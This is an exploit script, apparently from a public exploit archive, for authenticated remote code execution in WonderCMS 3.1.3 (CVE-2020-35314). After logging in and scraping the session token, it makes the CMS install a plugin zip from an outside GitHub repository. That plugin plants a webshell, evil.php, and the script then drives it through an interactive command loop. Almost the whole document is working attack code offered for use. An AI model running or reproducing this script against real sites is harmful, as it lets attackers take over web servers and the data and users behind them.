# Exploit Title: WonderCMS 3.1.3 - Authenticated Remote Code Execution
# Date: 2020-11-27
# Exploit Author: zetc0de
# Vendor Homepage: https://www.wondercms.com/
# Software Link: https://github.com/robiso/wondercms/releases/download/3.1.3/WonderCMS-3.1.3.zip
# Version: 3.1.3
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-35314


# WonderCMS is vulnerable to Authenticated Remote Code Execution.
# In order to exploit the vulnerability, an attacker must have a valid authenticated session on the CMS.
# Using the theme/plugin installer attacker can install crafted plugin that contain a webshell and get RCE.

# python3 exploit.py http://wonder.com/loginURL GpIyq0RH
# -------------
# [+] Getting Token
# [+] Sending Payload
# [+] Get the shell
# [+] Enjoy!
# $id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

import requests
import sys
import re
from bs4 import BeautifulSoup
from termcolor import colored


print(colored('''

\ \      /_ \  \ | _ \ __| _ \  __|  \  |  __|
 \ \ \  /(   |.  | |  |_|    / (    |\/ |\__ \
  \_/\_/\___/_|\_|___/___|_|_\\___|_|  _|____/

------[ Auth Remote Code Execution ]------
	''',"blue"))

if len(sys.argv) != 3:
    print(colored("[-] Usage : ./wonder.py loginURL password","red"))
    exit()

loginURL = sys.argv[1]
password = sys.argv[2]

r = requests.session()
data = { "password" : password }
page = r.post(loginURL,data)
if "Wrong" in page.text:
	print(colored("[!] Exploit Failed : Wrong Credential","red"))
	exit()

print(colored("[+] Getting Token","blue"))
soup = BeautifulSoup(page.text, "html.parser")

allscript  = soup.find_all("script")
no = 0
for i in allscript:
	if "rootURL" in str(i):
		url = i.string.split("=")[1].replace('"','').strip(";").lstrip(" ")
	elif "token" in str(i):
		token = i.string.split("=")[1].replace('"','').strip(";").lstrip(" ")

payload = "https://github.com/zetc0de/wonderplugin/archive/master.zip"

def sendPayload(req,url,payload,token):
	getShell = url + "?installThemePlugin=" + payload + "&type=plugins&token=" + token
	req.get(getShell)
	shell = url + "plugins/wonderplugin/evil.php"
	checkshell = req.get(shell)
	if "1337" in checkshell.text:
		return True
	else:
		return False

print(colored("[+] Sending Payload","blue"))
shell = sendPayload(r,url,payload,token)


if shell == True:
	print(colored("[+] Get the shell","blue"))
	print(colored("[+] Enjoy!","blue"))
	shell = url + "plugins/wonderplugin/evil.php"
	while True:
		cmd = input("$")
		data = { "cmd" : cmd }

		res = r.post(shell,data)
		if res.status_code == 200:
			print(res.text)
elif shell == False:
	print(colored("[+] Get the shell","blue"))
	print(colored("[+] Enjoy!","blue"))
	shell = url + "plugins/wonderplugin-master/evil.php"
	while True:
		cmd = input("$")
		data = { "cmd" : cmd }
		res = r.post(shell,data)
		if res.status_code == 200:
			print(res.text)
else:
	print(colored("[!] Failed to exploit","red"))